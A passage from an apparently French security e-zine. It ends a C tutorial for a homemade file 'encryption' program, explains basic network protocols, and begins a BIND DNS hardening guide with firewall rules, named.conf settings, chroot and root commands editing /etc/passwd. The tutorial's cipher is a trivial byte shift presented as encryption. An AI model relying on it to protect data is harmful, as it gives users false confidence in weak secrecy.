nous essayons d'abord d'ouvrir<BR>le fichier en mode lecture. Si le pointeur contient 
NULL, cela veut dire<BR>que le fichier n'existe pas. Sinon, le fichier existe 
d&eacute;j&agrave;. Pour la demande<BR>&agrave; l'utilisateur, nous utilisons 
encore une structure conditionnelle switch().</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">crypt: 
<BR>for(car=0;code&lt;0;code+=256); <BR>for(car=0;code&gt;255;code-=256); <BR>fclose(dest); 
<BR>dest=fopen(dst,&quot;wb&quot;);</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Cette 
routine permet de pr&eacute;parer la proc&eacute;dure principale d'encryptage 
en<BR>ouvrant le fichier destination et en pr&eacute;parant la cl&eacute; de cryptage 
en la<BR>remettant sur un octet c'est-&agrave;-dire entre 0 et 255 compris. Nous 
le faisons<BR>au moyen de la structure conditionnelle for(); <BR>cryptage: <BR>oct=fgetc(sourc); 
<BR>if(feof(sourc)) <BR> {goto file_end;} <BR>oct +=code; </FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">for(sur=0;oct&lt;0;oct+=256); 
<BR>for(sur=0;oct&gt;255;oct-=256); <BR>oct=255-oct; <BR>fputc(oct,dest); <BR>goto 
cryptage;</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Voici 
la routine d'encryptage : celle-ci consiste a lire un octet du fichier,<BR>&agrave; 
y ajouter le code de l'utilisateur, &agrave; le r&eacute;tablir sur un octet c'est-&agrave;-dire<BR>entre 
0 et 255 compris et &agrave; faire l'inverse bit-&agrave;-bit ce qui consiste 
&agrave;<BR>soustraire la valeur &agrave; 255. Le r&eacute;sultat de cette soustraction 
est &eacute;crite<BR>dans le fichier de destination. Si l'octet lu est le dernier, 
on quitte<BR>la rutine d'encryptage sinon on continue. Les fonctions fgetc() et 
fputc()<BR>permettent de respectivement lire et &eacute;crire un octet dans un 
fichier. <BR>file_end: <BR>clrscr(); <BR>fcloseall();<BR>Cette s&eacute;rie de 
2 instructions permet d'une part d'effacer l'&eacute;cran mais<BR>aussi de fermer 
tous les fichiers ouverts gr&acirc;ce &agrave; fcloseall(). Ceci est<BR>tr&egrave;s 
important dans la mesure ou les donn&eacute;es ne sont &eacute;crites sur le disque<BR>qu'apr&egrave;s 
fermeture des fichiers . <BR>printf(&quot;Delete old file: %s (y/n)?&quot;,src); 
<BR>re_ask3: <BR>i=getch(); <BR>switch(i) <BR> { <BR> case 121: <BR> sourc=fopen(src,&quot;rb&quot;); 
<BR> fputc(0,sourc); <BR> fclose(sourc);remove(src); <BR> goto pre_end; <BR> case 
110: <BR> goto pre_end; <BR> default: <BR> goto re_ask3; <BR> }</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Ici, 
nous demandons &agrave; l'utilisateur s'il souhaite effacer le fichier source.<BR>Si 
c'est le cas, nous n'allons pas directement effacer moyen de la command<BR>remove(). 
En effet, celle-ci ne prot&egrave;ge pas contre les programmes comme<BR>undelete 
qui permettrait de retrouver le fichier . Nous allons d'abord<BR>l'ouvrir en &eacute;criture 
de mani&egrave;re &agrave; effacer son contenu puis nous y &eacute;crivons<BR>juste 
un octet nul , nous le refermons et l'effa&ccedil;ons ensuite avec remove.<BR>Il 
est toujours accessible via undelete mais on acc&egrave;de &agrave; un fichier 
vide.</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">pre_end: 
<BR>printf(&quot;\nFin du cryptage...\nAutre fichier &agrave; encrypter / d&eacute;crypter<BR>(Y/N)?\n&quot;); 
</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">re_ask4: <BR>car=getch(); 
<BR>switch(car) <BR> {case 121: <BR> oct=0;goto get_name; <BR> case 110: <BR> 
goto end; <BR> default: <BR> goto re_ask4; <BR> } <BR>end: <BR>clrscr(); <BR>printf(&quot;\t 
coded by Nocte\ <BR>\n\tAll rights reserved Juin 2003&quot;); <BR>fcloseall(); 
<BR>}</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"><BR> Alors, 
&ccedil;a vous a plu ? Voil&agrave; ce programme fini. Ne vous inqui&eacute;tez 
pas,<BR>nous irons plus loin la prochaine fois et d&eacute;velopperons les points 
qui<BR>vous auront parus obscurs : pour cela, n'h&eacute;sitez pas, balancez vos 
soucis<BR>sur le forum. J'esp&egrave;re que cet article vous aura appris des choses 
int&eacute;ressantes.</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"><BR>++<BR>Nocte 
/ DHS</FONT></P><P> <FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"><BR> </FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">-------------------------------------<BR>ETUDES 
DE PROTOCOLES - POUR LES NULS<BR>-------------------------------------<BR>Les 
machines ne communiqueront pas uniquement parce qu'on a con&ccedil;u un r&eacute;seau,<BR>tirer 
des c&acirc;bler et mis &agrave; jour les fichiers de configuration! Nous allons<BR>ici 
&eacute;tudier les protocoles, que l'on peut d&eacute;finir comme un ensemble 
de<BR>r&eacute;gles (dans le but de faire communiquer deux machines ou plus).<BR>Avant 
cela, r&eacute;vison des notions fondamentales.</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">PARTIE 
1 : INTRODUCTION</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">I. 
ARCHITECTURE DES RESEAUX, PROTOCOLES ET SERVICES<BR>----------------------------------------------------<BR> 
Afin de communiquer sur un r&eacute;seau, les machines utilisent un ensemble<BR>de 
r&egrave;gles, conventions, appel&eacute;es &quot;protocoles&quot;. Compte tenu 
de<BR>leur complexit&eacute; (et si l'on se base sur le principe de modularit&eacute;), 
les<BR>protocoles ont une structure en couches afin de faciliter et contr&ocirc;ler<BR>leurs 
impl&eacute;mentations. Cela a pour principal atout d'isoler les diff&eacute;rents<BR>protocoles 
: tout changement introduit dans l'un de ces protocoles n'affecteront<BR>donc 
par les fonctionnalit&eacute;s des autres.<BR> Ce mod&egrave;le offre des interfaces 
entre les diff&eacute;rentes couhes afin de<BR>permettre aux protocolesd'une couche 
donn&eacute;e d'interagir avec ceux des couches<BR>qu'il lui sont directement 
adjacentes. Ces interfaces sont conventionnelles.<BR>Cela a pour avantage que 
si deux protocoles de deux couches diff&eacute;rentes<BR>ont une structure internes 
totalement diff&eacute;rentes (car diff&eacute;rents contructeurs,<BR>etc.), ils 
pourront quand m&ecirc;me communiquer ensemble car leur interface<BR>est g&eacute;n&eacute;rique 
: on &eacute;limine donc d'embl&eacute;e les &eacute;ventuels probl&egrave;mes 
d'incompatibilit&eacute;.<BR> Chacune des couches s'appuie sur des services offerts 
par une couche<BR>inf&eacute;rieure et vise &agrave; offrir ses services &agrave; 
la couche qui lui est sup&eacute;rieure.</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">II. 
MODELE OSI<BR>---------------<BR> L'ISO (International Standards Organization) 
est un organisme de standardisation<BR>qui a d&eacute;fini une architecture normalis&eacute;e 
pour les r&eacute;seaux : le mod&egrave;le OSI<BR>(Open Systems Interconnection). 
C'est donc le mod&egrave;le ISO OSI;) Elle est<BR>d&eacute;compos&eacute;e en 
7 couches (nous n'en reparlerons pas, le mod&egrave;le OSI a d&eacute;j&agrave;<BR>&eacute;t&eacute; 
cit&eacute; x fois dans THJ) : la couche physique, la couche liaison de donn&eacute;es<BR>(divis&eacute;e 
en deux sous-couches : MAC (Medium Access Control) et LLC (Logical<BR>Link Control), 
la couche r&eacute;seau, la couche transport, la couche session,<BR>la couche 
pr&eacute;sentation et la couche application.<BR> Etudions maintenant le but de 
cet article, les protocoles.<BR>NB: Nous excepterons ici l'&eacute;tude de la 
couche physique (qui comprend les<BR>param&egrave;tres &eacute;lectriques du m&eacute;dium 
etc.) et la couche 2, peut int&eacute;ressante<BR>dans cet article (notons que 
le protocole utiliser pour la couche 2 est<BR>CSMA/CD (norme ISO 802.3)).</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"><BR>III. 
LE PROTOCOLE ARP<BR>--------------------<BR> Le protocole ARP (Address Resolution 
Protocol) permet &agrave; une machine<BR>A de trouver, si elle existe, l'adresse 
Ethernet d'une autre machine B,<BR>connect&eacute;e sur le m&ecirc;me r&eacute;seau, 
en donnant uniquement l'adresse Internet<BR>de celle-ci. SOn r&ocirc;le est de 
masquer l'adresse physiques des machines<BR>aux pplications op&eacute;rant &agrave; 
un niveau sup&eacute;rieur pourqu'elle ne manipule que<BR>les adresses Internet. 
A l'oppos&eacute;, le protocole RARP (Reverse-ARP), sert<BR>&agrave; retrouver 
l'adresse Internet d'une machine du r&eacute;seau d&egrave;s lors que l'on<BR>a 
son adresse Ethernet (ce qui peut &ecirc;tre int&eacute;ressant pour booter une 
machine<BR>via le r&eacute;seau par exemple). On notera que l'utilisateur n'a 
pas acc&egrave;s &agrave;<BR>ces deux protocoles mais le protocole IP les utilise 
quand il en a besoin.</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">III. 
LE PROTOCOLE IP<BR>---------------------<BR> Gardons &agrave; l'esprit la diff&eacute;rence 
en un r&eacute;seau local LAN et un r&eacute;seau<BR>&eacute;tandu WAN (bien qu'on 
regroupe souvent ces deux expressions sous le terme<BR>g&eacute;n&eacute;rique 
&quot;r&eacute;seau&quot;. Un LAN regroupe un ensemble de machines g&eacute;ographiquement<BR>proche 
(aussi appel&eacute; &quot;r&eacute;seau d'entreprise&quot;) reli&eacute; par 
un c&acirc;ble<BR>physique : c'est le cas d'un r&eacute;seau Ethernet. Un WAN 
est un amas de LAN<BR>interconnect&eacute;s entre eux.<BR> Ainsi, le protocole 
IP permet au couches sup&eacute;rieures de faire abstraction<BR>de l'ensemble 
des LAN qu'il faut parfois traverser pour acheminer un paquet<BR>dans un WAN. 
Ces couches sup&eacute;rieures n'ont donc pas &agrave; se soucier du trajet<BR>que 
les paquets doivent suivre : pour elles, la liaison est directe. Cette<BR>gestion 
des routes dans un WAN est appel&eacute; &quot;routage&quot;. En outre,<BR>les 
LAN qui forme le WAN peuventn utiliser des protocoles et des trames<BR>diff&eacute;rents 
(ils sont alors dits &quot;h&eacute;t&eacute;rog&egrave;nes&quot;). Le protocole<BR>IP 
aura alors pour but de d&eacute;couper, puis r&eacute;assembler ces paquets (ce 
m&eacute;canisme<BR>est appel&eacute; &quot;fragmentation&quot;)..<BR> Le service 
principal offert par IP est l'&eacute;mission et la r&eacute;ception de<BR>paquets 
de donn&eacute;es appel&eacute;s &quot;datagrammes&quot;. Ce service est dit<BR>&quot;non 
fiable&quot; dans la mesure o&ugrave; la perte/alt&eacute;ration d'un paquet<BR>pendant 
son transport ne g&eacute;n&egrave;re aucun m&eacute;canisme permettant de r&eacute;cup&eacute;rer<BR>ces 
erreurs. Les protocoles TCP et UDP se basent dessus.<BR>Je ne redonnerais pas 
l'ent&ecirc;te d'un paquet IP, d&eacute;j&agrave; expliqu&eacute; en d&eacute;tail<BR>par 
Redils dans le Manuel 7 (Raws Sockets, Part 1).</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">IV. 
LE PROTOCOLE ICMP<BR>-----------------------<BR> IP offre un service non fiable, 
nous l'avons dit. Si donc un paquet<BR>est perdu ou qu'une anonmalie se produit 
au niveau des fonctionnalit&eacute;s<BR>de IP, celui-ci ne rapporte aucune information 
quant &agrave; l'erreur.<BR> Afin de parer &agrave; cette faiblesse, les concepteurs 
ont introduit dans<BR>la famille des protocoles TCP/IP un m&eacute;canisme appel&eacute; 
ICMP (Internet Control<BR>Message Protocol). Sa fonctionnalit&eacute; principale 
est de rapporter, &agrave; la<BR>station &eacute;mettrice du paquet, les erreurs 
qui peuvent se produire au niveau<BR>IP. Ainsi, s'il arrive que le protocole IP 
n'arrive pas &agrave; remplir son r&ocirc;le<BR>correctement, il l'indique au 
protocole ICMP qui &eacute;met alors un parquet<BR>&agrave; destination de la 
station source notifiant la nature qui informe le protocole<BR>IP de l'occurence 
de cette erreur. Ce dernier avisera alors. ICMP est aussi<BR>utilis&eacute; pour 
tester un r&eacute;seau.<BR> Il existe une douzaine de type de messages ICMP et 
chacun est encapsul&eacute;<BR>dans un paquet IP. Les plus couramment utilis&eacute;s 
sont :<BR>- ECHO REQUEST &amp; ECHO REPLY sont utilis&eacute;s pour voir si une 
destination<BR>donn&eacute;e(une station) est accessible et op&eacute;rationnelle. 
A la r&eacute;ception d'un<BR>message ECHO REQUEST, le destinataire doit r&eacute;pondre 
ECHO REPLY. (le premier<BR>est un ping et le seconde un pong (r&eacute;ponse &agrave; 
un ping)).<BR>- DESTINATION UNREACHABLE est g&eacute;n&eacute;r&eacute; quand 
le protocole IP ne sait pas<BR>comment joindre la station &agrave; qui est destin&eacute; 
un datagramme (quand, par<BR>exemple, il n'y a pas de r&eacute;ponse, du protocole 
ARP).<BR>- SOURCE QUENCH est utilis&eacute; pour &quot;brider&quot; des stations 
qui envoient<BR>un trop grand nombre de datagrammes. A la r&eacute;ception de 
ce message, la station<BR>devrait mod&eacute;rer sa cadence d'&eacute;mission 
des datagrammes (une sorte d'anti-flood).<BR>- TIME EXCEEDED est envoy&eacute; 
quand un datagramme &agrave; son TTL 5Time To Live,<BR>osn compteur) &agrave; 
z&eacute;ro : il est donc d&eacute;truit par le routeur par lequel il<BR>transite. 
C'est un tout b&ecirc;te time out.<BR>- PROBLEM PARAMETER indique qu'une valeur 
ill&eacute;gale a &eacute;t&eacute; d&eacute;tect&eacute;e dans<BR>un champ de 
l'ent&ecirc;te d'un datagramme.<BR> En ce qui concerne le m&eacute;canisme de 
fragmentation des paquets IP, si<BR>la machine a laquelle sont envoy&eacute;s 
les datagrammes ne poss&egrave;de pas un m&eacute;canisme<BR>de r&eacute;assemblage 
au niveau IP, il faut interdire la fragmentation des datagrammes<BR>qui lui sont 
destin&eacute;s. Le flag DF (Don't Fragment) est utilis&eacute; &agrave; cet effet<BR>: 
positionn&eacute; &agrave; 1, la fragmentaiton est interdite pour les routeurs 
suivants.<BR>Il se peut alors qu'il soit impossible d'acheminer un paquet.</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"><BR>PROTOCOLE 
DE COUCHE 4 =&gt; TCP/UDP<BR>---------------------------------<BR>V. LE PROTOCOLE 
TCP<BR>--------------------<BR> Le service offert par TCP (Transmission Control 
Protocol) peut &ecirc;tre<BR>compar&eacute; au t&eacute;l&eacute;phone : quand 
vous t&eacute;l&eacute;phonez &agrave; quelqu'un, le dialogue ne<BR>peut s'instaurer 
qu'&agrave; partir du moment ou l'interlocuteur d&eacute;croche son<BR>combin&eacute; 
et dit &quot;Allo&quot; (la connexion est alors r&eacute;tablie) : on<BR>peut 
dialoguer.<BR> Un protocole offrant un tel service est dit &quot;orient&eacute; 
connexion&quot;<BR>: cela signifie que si deux processus veulent s'&eacute;changer 
des donn&eacute;es par<BR>TCP, ils doivent pr&eacute;alablement &eacute;tablir 
une connexion virtuelle. Une fois<BR>celle-ci &eacute;tablit, le TCP garantit 
que toutes les donn&eacute;es envoy&eacute;es par le<BR>premier processus seront 
re&ccedil;ues sans la moindre erreur par le deuxi&egrave;me<BR>: on aura donc 
aucune perte ni modification de donn&eacute;es lors du transit.<BR>En outre, TCP 
garde l'ordre des donn&eacute;es : elles arrive de mani&egrave;re s&eacute;quentielle.<BR> 
utre cela, le service offert par TCP poss&egrave;de la caract&eacute;ristique 
d'&ecirc;tre<BR>de type &quot;byte-stream&quot; (flux d'octets): si le premier 
processus<BR>envoi 5 puis 15 caract&egrave;res, ceux-ci peuvent&ecirc;tre r&eacute;cup&eacute;r&eacute;s 
de diff&eacute;rentes<BR>mani&egrave;res par le processus distant :<BR>- un lecture 
de 20 caract&egrave;res<BR>- deux lectures de 10 caract&egrave;res<BR>- deux lectures 
de 7 et une lecture de 6 caract&egrave;res...<BR> Par cons&eacute;quente, il n'y 
a pas de d&eacute;coupage fixe dans le flux de donn&eacute;es<BR>v&eacute;hicul&eacute;es.<BR>A 
noter qu'un m&ecirc;me processus peut g&eacute;rer simultan&eacute;ment plusieurs 
connexion<BR>TCP (il peut, par exemple, ouvrir deux connexions avec deux processus 
s'ex&eacute;cutant<BR>sur deux machines diff&eacute;rentes).</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Voici 
son ent&ecirc;te:<BR>-------<BR>SCHEMA1<BR>-------<BR>Le champ Code bits est compos&eacute; 
des 6 flags : URG, ACK, PSH, RST, SYN, FIN.<BR>S&eacute;mantique des champs:<BR>- 
SOURCE PORT ET DESTINAITON PORT : no comment.<BR>- SEQUENCE NUMBER et ACK NUMBER 
Sont utilis&eacute;s pour le s&eacute;quencement et le<BR>contr&ocirc;le d'erreur 
des donn&eacute;es (le flag ACK indique si le champ ACK NUMBER<BR>contient une 
valeur valide).<BR>- HLen indique la taille du header TCP en mots de 4 octets 
(la taille de<BR>la socket TCP ets variable : elle peut &ecirc;tre compl&eacute;t&eacute;e 
par une ou plusieurs<BR>options de 4 octets chacunes).<BR>- CHECKSUM est la somme 
de contr&ocirc;le.<BR>- URGENT POINTER (flag URG) est utilis&eacute; pour le transport 
de &quot;donn&eacute;es<BR>urgentes&quot; (le flag URG indique si le champ URGENT 
POINTER contient<BR>une valeur valide).<BR>- les flags SYN et FIN sont utilis&eacute;s 
pour l'&eacute;tablissement et la fermeture<BR>des connexions virtuelles.<BR>- 
le flag RST sert &agrave; signaler au destinataire une demande de re-initialisation<BR>des 
connexions qui sont dans un &eacute;tat incertain (SYN dupliqu&eacute;s, panne...)<BR>- 
le flag PSH : on ne l'&eacute;tudiera pas.<BR>- le champ WINDOWS est utilis&eacute; 
par le contr&ocirc;le de flux.</FONT></P><P></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">VI. 
LE PROTOCOLE UDP<BR>--------------------<BR> Le service offert par le protocole 
UDP peut &ecirc;tre compar&eacute; &agrave; celui offert<BR>par la poste : quand 
vous postez une lettre, et si vous demandez le tarif<BR>habituel, il peut arriver 
qu'une lettre se perde. Par ailleurs, il se peut<BR>qu'elle arrive &agrave; destination 
apr&egrave;s une autre lettre qui avait pourtant<BR>&eacute;t&eacute; post&eacute;e 
apr&egrave;s elle... Pareillement, deux processus peuvent aussi utiliser<BR>le 
protocole UDP pour s'envoyer des donn&eacute;es. Avec UDP, aucune conneixon<BR>pr&eacute;alable 
n'est n&eacute;cessaire, mais, &agrave; l'inverse de TCP, UDP ne donne aucune<BR>garantie 
quant &agrave; la qualit&eacute; du service propos&eacute; : des donn&eacute;es 
peuvent &ecirc;tre<BR>perdues, arriver dans le d&eacute;sordre, &eacute;ventuellement 
modifi&eacute;es... C'est &agrave;<BR>l'utilisateur d'&eacute;ventuellement effectuer 
ces contr&ocirc;les. UDP est tr&egrave;s diff&eacute;rent<BR>de TCP par sa fonction 
: il v&eacute;hicule des paquets de donn&eacute;es (alors que<BR>TCP v&eacute;hicule 
un flux de donn&eacute;es). Ainsi, si un process envoi 5 puis 15<BR>caract&egrave;res 
par UDP, le process distant ne pourra les lire qu'en deux paquets<BR>s&eacute;par&eacute;ment. 
Ainsi, l'unit&eacute; d'information avec UDP est le MESSAGE ; avec<BR>TCP, c'est 
L'OCTET.</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"> Une 
question peut se poser : pourquoi un process choisirait le protocole<BR>TCP ou 
UDP. Les cri&egrave;tres de s&eacute;lection d&eacute;pendant &eacute;videmment 
des caract&eacute;ristique<BR>de TCP et UDP. Par exemple, si l'on veut absolument 
un communication fiable<BR>&agrave; 100%, on pr&eacute;f&egrave;rera TCP... On 
prendra aussi en compte le type de donn&eacute;es<BR>&eacute;chang&eacute;es. 
AInsi, le protocole UDP sera plus adpat&eacute; pour un process serveur<BR>dont 
les messages sont de types &quot;REQUEST-REPLY&quot;. Par contre,<BR>un transfert 
de fichier &eacute;tant assimil&eacute; &agrave; un envoi de flux d'octets, on<BR>choisira 
plut&ocirc;t TCP pour une telle communication.</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"> 
Finalement, quant au protocole UDP, retenons qu'il ne garantit pas une<BR>communication 
fiable et l'unit&eacute; de transfert est le paquet de donn&eacute;es.</FONT></P><P></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">VII. 
VOILA<BR>-----------<BR>J'esp&egrave;re que cet article qui reprenait, pour les 
newbie, les protocoles<BR>de communication vous aura &eacute;t&eacute; fort utile. 
Il est, certes, bien incomplet<BR>sur certains points et parfois tr&egrave;s superficiel, 
mais, e pense qu'il constituera<BR>une tr&egrave;s bonne base pour ceux voulant 
avoir un vision global des ces protocoles<BR>avant un &eacute;ventuel approfondissement. 
Pour tout question, n'h&eacute;sitez pas,<BR>l&acirc;chez vous sur le forum.</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"><BR>++<BR>Nocte</FONT></P><P> 
<FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"><BR> </FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">---------------------------<BR>SECURISATION 
DU DEMON BIND<BR>---------------------------</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"> 
Cet article est destin&eacute; aux particuliers et administrateurs syst&egrave;mes<BR>qui 
souhaitent prot&eacute;ger leur serveur d'un point potentiellement vuln&eacute;rables<BR>: 
le d&eacute;mon BIND.</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"> 
Ce d&eacute;mon est utilis&eacute; par plusieurs distributions Linux et fournit 
le<BR>service des noms de domaines DNS. Etant donn&eacute; sa complexit&eacute; 
de structure<BR>et de configuration, multiples failles y ont &eacute;t&eacute; 
d&eacute;couvertes. C'est pour<BR>cela qu'il est courant aujourd'hui d'op&eacute;rer 
dans un environnement chroot&eacute;<BR>(le chroot est un peu comme une prison 
ou un pirate ne peut pas s'&eacute;chapper).</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"> 
Cet article vous serez s&eacute;rieusement utile si vous deviez fournir un type<BR>d'acc&egrave;s 
quelconque au port DNS sur une interface de r&eacute;seau externe. </FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">1. 
SECURITE DE BIND AVANT CHROOT()<BR>-----------------------------------</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"> 
Avant d'appliquer un chroot named, il faut surtout maintenir &agrave; jour vos<BR>paquetages 
BIND. Parfois, les patchs s'encha&icirc;nent lors de d&eacute;couvertes de<BR>failles 
successives. Soyez donc prudent si votre socket BIND est ouvert<BR>aux h&ocirc;tes 
sur une interface de r&eacute;seau externe.</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"> 
BIND communique via TCP (pour de grandes requ&ecirc;tes) et UDP (pour les moins<BR>grandes 
requ&ecirc;tes). Il va falloir y penser lors du filtrage de paquets avec<BR>ipchains 
ou iptables. <BR>Voici une forme g&eacute;n&eacute;rale de ipchains :<BR>Ipchains 
-A input -p tcp -s 100.100.100.100/24 \<BR> -d int.ip.number.here domain -j ACCEPT<BR>Ipchains 
-A input -p udp -s 100.100.100.100/24 \<BR> -d int.ip.number.here domain -j ACCEPT<BR>Ipchains 
-A input -p tcp -s trusted.ext.system.ip \<BR> -d ext.ip.number.here domain -j 
ACCEPT<BR>Ipchains -A input -p udp -s trusted.ext.system.ip \<BR> -d ext.ip.number.here 
domain -j ACCEPT<BR>ipchains -A input -I ! lo \<BR> -d ext.ip.number.here domain 
-j DENY -l<BR>Pour iptables, je ne refais pas le filtrage de port DNS, c'est presque<BR>identique, 
juste pour la syntaxe, le premier filtrage donne :<BR>iptables -t filter -A INPUT 
-p tcp -s 100.100.100.100/24 \<BR> -d int.ip.number.here -desnation-port domain 
\<BR> -j ACCEPT<BR> et la derni&egrave;re requ&ecirc;te, sp&eacute;ciale, donne 
:<BR>iptables -t filter -A INPUT -i ! lo \<BR> -d ext.ip.number.here -j DROP<BR>Notez 
que cette derni&egrave;re commande &eacute;limine par filtrage tous les paquets<BR>non 
except&eacute;s pr&eacute;c&eacute;demment. Elle doit toujours &ecirc;tre unique 
et pr&eacute;sente en<BR>fin de filtrage.</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"> 
Autre point important : le fichier named.conf. C'est un vrai El-Dorado<BR>pour 
un cracker.<BR>D'abord, il faut emp&ecirc;cher BIND de r&eacute;v&eacute;ler l'information 
concernant sa version<BR>quand un tiers l'interroge car cela repr&eacute;sente 
50 % du travail du pirate<BR>(90 % si le syst&egrave;me est Windows, car il est 
bourr&eacute; de bugs ;). Donc, dans<BR>la section option, il faut avoir :<BR>Options 
{<BR> Version &quot;D&eacute;sol&eacute;, le num&eacute;ro de la version n'est 
pas disponible.&quot;;<BR>};</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Ensuite, 
ce fichier impose les contr&ocirc;le d'acc&egrave;s. Voici les items dans cette<BR>zone, 
&agrave; vous de choisir apr&egrave;s :<BR>- allow_query : d&eacute;termine quels 
h&ocirc;tes (ou r&eacute;seaux) auront la permission<BR>de recevoir des requ&ecirc;tes 
ordinaires aupr&egrave;s de ce serveur.<BR>- allow_transfer : d&eacute;termine 
quels h&ocirc;tes (ou r&eacute;seaux) auront la permission<BR>de recevoir des 
transferts de zone &agrave; partir de ce serveur.<BR>- allow_recursion : d&eacute;termine 
quels h&ocirc;tes (ou r&eacute;seaux) auront la permission<BR>de faire des requ&ecirc;tes 
r&eacute;p&eacute;titives aupr&egrave;s de ce serveur.<BR>- allow_updates : d&eacute;termine 
quels h&ocirc;tes (ou r&eacute;seaux) auront la permission<BR>de soumettre des 
MaJ dynamiques de DNS &agrave; ce serveur.<BR>- blackhole : d&eacute;termine quels 
h&ocirc;tes (ou r&eacute;seaux) seront emp&ecirc;ch&eacute;s d'obtenir<BR>une 
communication quelconque avec ce serveur.<BR>Permettre allow_transfer est tr&egrave;s 
d&eacute;licat: un pirate pourrait mapper votre<BR>r&eacute;seau. d'une mani&egrave;re 
g&eacute;n&eacute;ral, un type de r&eacute;glages assez judicieux pourrait<BR>&ecirc;tre 
:<BR>Options {<BR> Version &quot;D&eacute;sol&eacute;, le num&eacute;ro de la 
version n'est pas disponible.&quot;;<BR> Allow_query {<BR> Localhost;<BR> };<BR> 
allow_transfer {<BR> none;<BR> };<BR> allow_recursion {<BR> none;<BR> };<BR>};</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif">Ainsi, 
les requ&ecirc;tes g&eacute;n&eacute;rales provenant du localhost seront permises. 
A<BR>l'inverse, les requ&ecirc;tes r&eacute;p&eacute;titives ou transfert de zone 
sont tous refus&eacute;s.<BR>On peut aussi utiliser des sp&eacute;cificateurs 
de contr&ocirc;les d'acc&egrave;s (dans les<BR>accolades), au lieu d'utiliser 
les valeurs par d&eacute;faut dans une zone de<BR>donn&eacute;e. Les plus usuels 
sont :<BR>- any : aucun contr&ocirc;le d'acc&egrave;s (acc&egrave;s de n'importe 
quel h&ocirc;te depuis n'importe<BR>o&ugrave;).<BR>- None: tout acc&egrave;s interdit 
(acc&egrave;s a aucun h&ocirc;te, peu importe o&ugrave; il est).<BR>- Localhost: 
permet l'acc&egrave;s &agrave; l'h&ocirc;te local.<BR>- Localnet : permet l'acc&egrave;s 
aux hosts ayant une interface mat&eacute;rielle avec<BR>le localhost.<BR>- X.X.X.X:permet 
l'acc&egrave;s aux hosts ayant ce num&eacute;ro d'IP<BR>- X.X.X.X/X permet l'acc&egrave;s 
au r&eacute;seau ayant le sp&eacute;cificateur r&eacute;seau/masque<BR>correspondant 
(100.100.100.0/24 permet l'acc&egrave;s aux hosts sur le localhost<BR>100.100.100.</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"><BR>2. 
EXECUTION DE NAMED DANS UN ENVIRONNEMENT CHROOT()<BR>-----------------------------------------------------</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"> 
Un pirate cherchera obtenir un acc&egrave;s frauduleux via le d&eacute;mon BIND. 
Par<BR>cons&eacute;quent, nombreux sont les admins qui ex&eacute;cutent named 
dans un environnement<BR>chroot. Qu'est-ce ? Un environnement chroot trompe BIND 
pour qu'il croie<BR>qu'un sous-r&eacute;pertoire est le syst&egrave;me de fichiers 
root. Ainsi, pour tous<BR>les process, named peut &ecirc;tre ex&eacute;cuter dans 
/usr/local/bind, mais pour le<BR>process named et ses enfants, /usr/local/bind 
semblera &ecirc;tre le root (/).<BR>Si un cracker pirate named, &agrave; cause 
du chroot, il sera emprisonn&eacute; (chroot&eacute;)<BR>dans /usr/local/bind! 
Tout simple. La version 8 de BIND inclut sa propre<BR>fonctionnalit&eacute; chroot.<BR> 
Autre conseil : il est plus sage d'op&eacute;rer BIND sous un user (ou un groupe)<BR>qui 
contiendra le process named, plut&ocirc;t que de l'op&eacute;rer comme root. Comme<BR>chroot 
est inclut dans les versions r&eacute;centes de BIND, il suffit d'ajouter<BR>un 
user et un groupe pour named aux fichiers passwd et group de l'ensemble<BR>du 
syst&egrave;me se trouvant dans /etc :<BR>#echo &quot;named::29&quot; &gt;&gt;/etc/group<BR>#echo 
&quot;named:x:29:29:named:/:&quot; &gt;&gt;/etc/passwd<BR>Il faut maintenant rajouter 
un nouvel user named au fichier /etc/ftpusers<BR>(pas question que quelqu'un se 
loggue sous named en FTP) :<BR>#echo named &gt;&gt;/etc/ftpusers</FONT></P><P><FONT SIZE="2" FACE="Arial, Helvetica, sans-serif"> 
Apr&egrave;s cette pr&eacute;paration, revenons &agrave; l'ex&eacute;cution de 
